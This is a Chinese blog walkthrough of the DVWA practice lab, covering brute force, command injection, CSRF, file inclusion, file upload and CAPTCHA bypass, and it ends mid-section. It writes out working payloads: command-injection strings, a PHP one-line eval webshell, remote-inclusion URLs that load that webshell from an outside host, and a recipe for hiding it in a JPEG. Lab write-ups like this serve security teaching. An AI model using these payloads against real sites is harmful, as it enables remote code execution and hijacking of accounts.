@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyaxiao.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"posthide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="Brute Force这一关提供了一个简单的登录场景。 **攻击者的目标是：**通过脚本结合字典爆破出密码。 事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 admin 和 password。在表中，还有若干其他用户。 Low：简单暴力123456789101112131415161718192021222324252627282930313233343536">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习小屋">
+<meta property="og:url" content="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="学习小屋">
+<meta property="og:description" content="Brute Force这一关提供了一个简单的登录场景。 **攻击者的目标是：**通过脚本结合字典爆破出密码。 事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 admin 和 password。在表中，还有若干其他用户。 Low：简单暴力123456789101112131415161718192021222324252627282930313233343536">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/3106872127.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/4042635291.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/4124032546.png">
+<meta property="article:published_time" content="2025-09-23T08:25:32.374Z">
+<meta property="article:modified_time" content="2026-01-15T11:47:18.507Z">
+<meta property="article:author" content="wuyaxiao">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/3106872127.png">
+
+<link rel="canonical" href="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | 学习小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyaxiao.github.io/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuyaxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-09-23 16:25:32" itemprop="dateCreated datePublished" datetime="2025-09-23T16:25:32+08:00">2025-09-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-15 19:47:18" itemprop="dateModified" datetime="2026-01-15T19:47:18+08:00">2026-01-15</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>这一关提供了一个简单的登录场景。</p>
+<p>**攻击者的目标是：**通过脚本结合字典爆破出密码。</p>
+<p>事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 <code>admin</code> 和 <code>password</code>。在表中，还有若干其他用户。</p>
+<h3 id="Low：简单暴力"><a href="#Low：简单暴力" class="headerlink" title="Low：简单暴力"></a>Low：简单暴力</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get username</span></span><br><span class="line">	<span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get password</span></span><br><span class="line">	<span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">	<span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check the database</span></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) </span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . </span><br><span class="line">            ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? </span><br><span class="line">                <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : </span><br><span class="line">                ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)</span><br><span class="line">            ) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> </span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get users details</span></span><br><span class="line">		<span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">		<span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Login successful</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Login failed</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这一级别没有任何防御。</p>
+<h3 id="Medium：等待时间"><a href="#Medium：等待时间" class="headerlink" title="Medium：等待时间"></a>Medium：等待时间</h3><p>可以完成爆破，只是比 low 要慢一些。</p>
+<blockquote>
+<p>事实上，可以假设在网络延迟正常的情况下，如果密码正确，返回结果时间一般不会慢于 0.5 秒（这个阈值可以根据网络延迟调整）。所以，当一次尝试等待时间超过了 0.5 秒，可以直接认为密码错误而停止等待。这样可以节省不少时间。</p>
+</blockquote>
+<h3 id="High：随机等待时间-CSRF-防护"><a href="#High：随机等待时间-CSRF-防护" class="headerlink" title="High：随机等待时间 &amp; CSRF 防护"></a>High：随机等待时间 &amp; CSRF 防护</h3><p>添加了 token 只是略微增加了我们爆破的复杂性：每一个登录请求都必须对应一个对表单的请求。可以使用 BurpSuite 的「Grep - Extract」功能提取 token，用 Pitchfork 模式逐一尝试。</p>
+<p><img src="/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/3106872127.png" alt="截屏2022-08-03 17.44.14.png" title="截屏2022-08-03 17.44.14.png"></p>
+<h3 id="Impossible：账户锁定"><a href="#Impossible：账户锁定" class="headerlink" title="Impossible：账户锁定"></a>Impossible：账户锁定</h3><p>有了尝试三次账户锁定，暴力就基本上无法快速爆破特定账户了。</p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>这一关可以视为 Remote Code Execution（RCE）攻击的一个应用。提供的场景是：提供一个表单，接收用户输入的 IP 地址，在服务器上使用 PHP 的 <code>exec()</code> 执行 ping 命令，并返回输出的结果。</p>
+<p>**攻击者的目标是：**在服务器上执行任意我们想要的命令。</p>
+<h3 id="Low：不过滤"><a href="#Low：不过滤" class="headerlink" title="Low：不过滤"></a>Low：不过滤</h3><p>在后端直接将 <code>ping</code> 命令拼接上我们输入的字符串，然后执行。那么，用 <code>&amp;&amp;</code> 或者 <code>;</code> 就可以结束之前的命令，添加任意命令。比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1; ls -al</span><br></pre></td></tr></table></figure>
+
+<h3 id="Medium：简单过滤"><a href="#Medium：简单过滤" class="headerlink" title="Medium：简单过滤"></a>Medium：简单过滤</h3><p>在 low 的基础上，做了 <code>&amp;&amp;</code> 和 <code>;</code> 的检测，在字符串中将它们删除。</p>
+<p>能够做命令注入的不止上面两种字符，还可以用管道符 <code>|</code>。这个符号本来的用法是将上一个命令的输出作为下一个命令的输入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ls -al</span><br></pre></td></tr></table></figure>
+
+<h3 id="High：更多过滤"><a href="#High：更多过滤" class="headerlink" title="High：更多过滤"></a>High：更多过滤</h3><p>替换了不少字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">); </span><br></pre></td></tr></table></figure>
+
+<p>仔细观察，过滤的不是管道符这个字符，而是管道符加一个空格……所以用 <code>127.0.0.1 |ls</code> 这种还是可以的。</p>
+<p>并且没有过滤换行（<code>%0a</code>）、回车（<code>%0d</code>），这二者同样可以达到分隔多条命令的效果。当然，前端的输入框里无法输入换行，需要用别的工具发请求，将 ip 写为 <code>127.0.0.1%0als</code>。</p>
+<p>High 过滤了减号 <code>-</code>，所以无法处理带参数的命令。</p>
+<h3 id="Impossible：白名单"><a href="#Impossible：白名单" class="headerlink" title="Impossible：白名单"></a>Impossible：白名单</h3><p>「白名单」永远比「黑名单」安全。这个等级直接判断输入的 IP 是否符合 IPv4 格式，并且也引入了 CSRF 攻击防护。</p>
+<h2 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h2><p>这一关提供了一个修改密码的表单，要求输入新的密码并确认，提交后就能修改密码。</p>
+<p>**攻击者的目标是：**在受害者不知情的情况下，使受害者更改密码。</p>
+<p>**⚠️ 注意：**现代浏览器基本都已经禁止第三方 Cookie，这意味着无论如何配置，当发送跨域请求时都不能携带 Cookie，<strong>这一漏洞已经无法利用</strong>。</p>
+<p>以下介绍的仅为在允许第三方 Cookie 的情况下，理论利用方式。</p>
+<h3 id="Low：无防护"><a href="#Low：无防护" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>没有防范 CSRF 攻击的检测，并且通过 GET 请求发数据。只要攻击者诱导受害者打开一个 URL，或者向这个 URL 发送请求，就可以修改密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure>
+
+<h3 id="Medium：判断-referer"><a href="#Medium：判断-referer" class="headerlink" title="Medium：判断 referer"></a>Medium：判断 referer</h3><p>这一等级在收到请求后，判断 HTTP referer 请求头的内容是否包含当前服务器域名。</p>
+<p>然而，使用的是 <code>stripos</code> 函数，即单纯的子串检测。假设 DVWA 运行在 <code>dvwa.com</code>，那么只要 referer 包含这个子串即可。例如从 <code>skywt.cn</code> 发起攻击，一种简单的方式是：<code>https://skywt.cn/?a=dvwa.com</code>。</p>
+<h3 id="High：CSRF-token"><a href="#High：CSRF-token" class="headerlink" title="High：CSRF token"></a>High：CSRF token</h3><p>这一等级加入了 CSRF token，当用户加载表单时，表单内包含一个 hidden input，其中包含每次不同的 token；当提交时需要带上这个 token。</p>
+<p>这大大增加了攻击难度：恶意脚本需要使用用户的凭证先发送请求，获取页面上的 token，再将 token 一并发送，请求修改密码。</p>
+<h3 id="Impossible：提供原密码"><a href="#Impossible：提供原密码" class="headerlink" title="Impossible：提供原密码"></a>Impossible：提供原密码</h3><p>这一等级要求在修改密码请求中提供用户的原密码。攻击者无法得知用户的原密码，所以无法使用 CSRF 攻击。</p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>这一关提供的页面，在 URL 中指定参数 <code>page</code> 即可包含指定的页面。情境的本意是只能包含 file1、file2、file3 三个页面之一。</p>
+<p>**攻击者的目标是：**包含木马页面，执行我们想要的代码。</p>
+<h3 id="Low：无防护-1"><a href="#Low：无防护-1" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>直接可以进行任意文件包含，因为 URL 里可以任意引用文件，为所欲为。</p>
+<p>例如，在服务器 skywt.cn 上放一个一句话木马 <code>yjh.txt</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这行 PHP 代码拿到 GET 请求传入的 a 参数，然后作为代码执行。通过这一代码，我们可以执行任何代码。这就是「一句话木马」。</p>
+<p>接下来，访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/fi/?page=https://skywt.cn/yjh.txt&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>页面包含了我们的 <code>yjh.txt</code>，传入的 <code>phpinfo()</code>; 就会被执行，显示 PHP 信息。照此原理，能够执行任何 PHP 代码。</p>
+<p>利用 PHP 的 <code>exec()</code> 函数，事实上相当于已经拿到了系统的 shell。</p>
+<h3 id="Medium：关键词过滤"><a href="#Medium：关键词过滤" class="headerlink" title="Medium：关键词过滤"></a>Medium：关键词过滤</h3><p>对传入的 page 参数过滤了 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code> 这几个关键词。</p>
+<p>PHP 的 <code>str_replace</code> 函数只会进行「一次替换」，也就是将一个字符串中所有子串 A 进行替换，至于替换之后得到的新字符串是否包含子串 A，它并不关心。利用这个缺陷，我们可以使用「双写」的办法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/fi/?page=httpshttps://://skywt.cn/yjh.txt&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>（也可以结合下一关的文件上传，使其引用本地的木马文件，即 URL 不包含 <code>http(s)://</code> 协议。</p>
+<h3 id="High：只能是文件"><a href="#High：只能是文件" class="headerlink" title="High：只能是文件"></a>High：只能是文件</h3><p>限制了传入的 page 参数必须以 file 开头。本意是限制只能引用诸如 <code>file1.php</code> 这样的文件，然而事实上可以用 <code>file://</code> 协议引用本地的任何文件。</p>
+<p>需要结合下一关的文件上传漏洞，先上传一句话木马到本地，再引用。下文详述。</p>
+<h3 id="Impossible：白名单-1"><a href="#Impossible：白名单-1" class="headerlink" title="Impossible：白名单"></a>Impossible：白名单</h3><p>使用「白名单」，限制只能访问 file1、file2、file3 这三个 PHP 文件。</p>
+<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>这一关提供了一个表单，能在其中选择一个文件并上传。情境的本意是只能上传图片文件，但是由于不佳的实现，导致能够上传 PHP 脚本木马。</p>
+<p>**攻击者的目标是：**上传 PHP 木马并执行我们想要的代码。</p>
+<h3 id="Low：无防护-2"><a href="#Low：无防护-2" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>没有任何检测，直接将上传的文件保存并移动到某个特定的目录。</p>
+<p>上传之前提到的一句话木马 <code>yjh.php</code> 就行。在这个 URL 里，能够利用木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/hackable/uploads/yjh.php?a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Medium：限制-MIME"><a href="#Medium：限制-MIME" class="headerlink" title="Medium：限制 MIME"></a>Medium：限制 MIME</h3><p>只限制请求的 MIME 为 <code>image/jpeg</code> 或者 <code>image/png</code>，并不实际检测上传的内容。</p>
+<p>可以仍然上传这个 PHP 文件，只要在上传的请求中修改一下 Content-Type 就行了。</p>
+<p><img src="/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/4042635291.png" alt="截屏2022-08-05 12.11.55.png" title="截屏2022-08-05 12.11.55.png"></p>
+<p>也可以在真实的图片文件后加 PHP 一句话木马再上传。下文 high 中详述。</p>
+<h3 id="High：限制文件拓展名"><a href="#High：限制文件拓展名" class="headerlink" title="High：限制文件拓展名"></a>High：限制文件拓展名</h3><p>相比 medium，这个等级：</p>
+<p>第一个限制意味着，直接上传只包含一行 PHP 代码的一句话木马无法成功，必须上传一张真实的图片。我们可以用文本编辑器在一张真实的图片最后加上一句话木马。PHP 的特性是只会将 <code>&lt;?php ?&gt;</code> 或 <code>&lt;? ?&gt;</code> 中的内容视为脚本并运行，在这个之外的内容都会不解析而是直接显示。注意：使用这种方法，需要确保这个图片文件中，在我们插入的代码之前，没有出现过 <code>&lt;?</code> 这样的符号，否则在执行到我们的代码之前 PHP 就会抛出语法错误。</p>
+<p>如果使用日常的图片，生成 <code>&lt;?</code> 组合其实概率不低。我们可以生成一张最小的图片，确保不包含 <code>&lt;?</code> 组合：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert -size 1x1 xc:black yjh.jpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(\$_GET[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; yjh.jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传这个图片文件，能够规避第一条规则的检测。</p>
+<p>第二个限制，并不好解决。一般来说，像 Nginx 之类的 WebServer，PHP 环境的配置方式都是：对于服务器上以 <code>.php</code> 结尾的文件，交由 PHP 的引擎执行脚本；对于其他拓展名的文件，则直接视为静态资源呈现。这样，如果文件结尾不是 <code>.php</code>，我们无法将其单独作为 PHP 来执行。</p>
+<p>所以，这一关要结合上一关的文件包含漏洞。成功上传包含一句话木马的 <code>yjh.jpg</code> 之后，只要利用 <code>file://</code> 协议，访问这个 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/yjh.jpg&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：图片重新编码"><a href="#Impossible：图片重新编码" class="headerlink" title="Impossible：图片重新编码"></a>Impossible：图片重新编码</h3><p>相比之前的等级，该等级加入了更加复杂的检测：</p>
+<h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>这一关提供修改密码的场景，表单里提供了一个密码输入框、密码确认框，以及一个 reCAPTCHA 验证组件。期望的场景是：通过验证，才能提交修改密码。</p>
+<p>**攻击者的目标是：**不经过 reCAPTCHA 的验证也能实现修改密码。</p>
+<h3 id="Low：没用的-step-验证"><a href="#Low：没用的-step-验证" class="headerlink" title="Low：没用的 step 验证"></a>Low：没用的 step 验证</h3><p>这个 low 的实现真的很逆天，表单里有一个 hidden input 名为 <code>step</code>，初始 value 为 1。当为 1 时提交，验证 reCAPTCHA，如果通过则<strong>重新打开页面</strong>并将 <code>step</code> 改为 2。当为 2 时提交，则不验证 reCAPTCHA 直接修改密码。</p>
+<p>那么，直接在页面里将 <code>step</code> 改为 2 再提交就好了。</p>
+<h3 id="Medium：又一个没用的验证"><a href="#Medium：又一个没用的验证" class="headerlink" title="Medium：又一个没用的验证"></a>Medium：又一个没用的验证</h3><p>依然很逆天，在 low 的基础上，当 <code>step</code> 为 1 且验证通过时，重新打开页面，<code>step</code> 设为 2，并添加一个名为 <code>passed_captcha</code> 的 hidden input 并设为 true。</p>
+<p>和 low 类似，只要在页面里将 <code>step</code> 改为 2，添加 <code>passed_captcha</code>元素即可：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passed_captcha&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="High：开发者留的后门"><a href="#High：开发者留的后门" class="headerlink" title="High：开发者留的后门"></a>High：开发者留的后门</h3><p>相比前两个等级，high 终于没有使用愚蠢的 <code>step</code>。</p>
+<p>然而，在表单的注释里能看到这段内容：</p>
